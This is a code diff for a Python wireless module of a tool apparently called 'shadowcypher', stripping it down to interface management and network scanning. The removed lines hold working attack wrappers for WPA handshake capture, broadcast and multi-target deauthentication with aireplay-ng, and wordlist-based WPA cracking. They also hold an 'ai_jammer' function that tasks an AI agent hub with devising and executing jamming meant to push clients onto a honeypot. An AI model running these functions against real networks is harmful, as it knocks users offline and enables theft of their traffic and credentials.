@@ -1,6 +1,5 @@
 """
-Wireless Module — Apex Intelligence Build.
-Handles Aircrack-ng suite integration, WPA/WPA2 audits, and deauth attacks.
+Wireless Module — interface management and network scanning.
 """
 
 import logging
@@ -55,7 +54,7 @@ class Wireless(BaseModule):
         from shadowcypher.core.runner import runner
         return runner.execute_task("MON_OFF", ["airmon-ng", "stop", interface], callback=on_output)
 
-    # ── Scanning & Capture ──
+    # ── Scanning ──
 
     @staticmethod
     def scan_networks(interface, duration=30, on_output=None, on_complete=None):
@@ -71,74 +70,3 @@ class Wireless(BaseModule):
     def scan_wifi(interface, on_output=None):
         """Quick WiFi scan (legacy alias for scan_networks)."""
         return Wireless.scan_networks(interface, duration=30, on_output=on_output)
-
-    @staticmethod
-    def capture_handshake(interface, bssid, channel=6, timeout=120, on_output=None, on_complete=None):
-        """Capture a WPA/WPA2 handshake from a target AP."""
-        if not Wireless._check_iface(interface):
-            return
-        from shadowcypher.core.runner import runner
-        cap_file = f"/tmp/shadowcypher_cap_{bssid.replace(':', '')}"
-        args = [
-            "timeout", str(timeout),
-            "airodump-ng",
-            "--bssid", bssid,
-            "--channel", str(channel),
-            "--write", cap_file,
-            interface,
-        ]
-        return runner.execute_task(f"CAPTURE_{bssid}", args, callback=on_output)
-
-    # ── Attacks ──
-
-    @staticmethod
-    def deauth(interface, bssid, client_mac=None, count=10, on_output=None, on_complete=None):
-        """Send deauthentication frames to disconnect clients from an AP."""
-        if not Wireless._check_iface(interface):
-            return
-        from shadowcypher.core.runner import runner
-        client = client_mac or "FF:FF:FF:FF:FF:FF"
-        args = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, interface]
-        return runner.execute_task("DEAUTH", args, callback=on_output)
-
-    @staticmethod
-    def deauth_target(interface, bssid, client_mac="FF:FF:FF:FF:FF:FF", on_output=None):
-        """Legacy alias for deauth."""
-        return Wireless.deauth(interface, bssid, client_mac, on_output=on_output)
-
-    @staticmethod
-    def crack_wpa(cap_file, wordlist=None, on_output=None, on_complete=None):
-        """Crack a WPA handshake capture file."""
-        from shadowcypher.core.runner import runner
-        wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
-        args = ["aircrack-ng", "-w", wordlist, cap_file]
-        return runner.execute_task("WPA_CRACK", args, callback=on_output)
-
-    @staticmethod
-    def ai_jammer(bssid, on_output=None):
-        """Escalate to Swarm for complex signal-jamming strategies."""
-        from shadowcypher.core.hub import hub
-        return hub.dispatch_mission(
-            f"Devise and execute a smart deauth/jamming strategy for AP {bssid} "
-            "to force clients to our honeypot."
-        )
-
-    def deauth_swarm(self, bssid_list, iface="wlan0mon", on_output=None):
-        """Coordinated deauth across multiple targets using aireplay-ng."""
-        import shutil
-        import threading
-        if not shutil.which("aireplay-ng"):
-            if on_output: on_output("[WARN] aireplay-ng not found — install aircrack-ng suite.\n")
-            return
-        from shadowcypher.core.runner import runner
-        if on_output: on_output(f"[SIGNAL] SWARM_DEAUTH: {len(bssid_list)} targets on {iface}\n")
-
-        def _run_all():
-            for bssid in bssid_list:
-                if on_output: on_output(f"[DEAUTH] → {bssid}\n")
-                runner.execute_task(
-                    f"DEAUTH_{bssid}",
-                    ["aireplay-ng", "--deauth", "20", "-a", bssid, iface],
-                    callback=on_output,
-                )
-        threading.Thread(target=_run_all, daemon=True).start()
